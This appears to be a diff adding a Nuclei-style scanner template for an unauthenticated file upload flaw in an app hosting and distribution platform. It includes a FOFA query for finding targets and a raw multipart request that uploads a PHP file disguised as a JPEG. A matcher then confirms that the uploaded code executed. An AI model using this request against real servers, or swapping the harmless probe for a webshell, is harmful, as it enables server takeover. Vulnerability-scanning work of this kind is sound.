@@ -1,0 +1,43 @@
+id: Apptuoguan-index-uplog-File-upload
+
+info:
+  name: App托管服务分发平台 index-uplog.php 文件上传
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="/api/statistics/service-usage-amount"
+    App托管服务分发平台 index-uplog.php 接口处存在任意文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传webshell致服务器，执行任意代码，从而获取服务器权限。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139972168
+  tags: File upload
+
+http:
+  - raw:
+      - |
+        POST /source/pack/upload/2upload/index-uplog.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
+
+        ------WebKitFormBoundary03rNBzFMIytvpWhy
+        Content-Disposition: form-data; name="time"
+
+        1-2
+        ------WebKitFormBoundary03rNBzFMIytvpWhy
+        Content-Disposition: form-data; name="app"; filename="1.php"
+        Content-Type: image/jpeg
+
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundary03rNBzFMIytvpWhy--
+      - |
+        GET /source/data/tmp/1-2.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
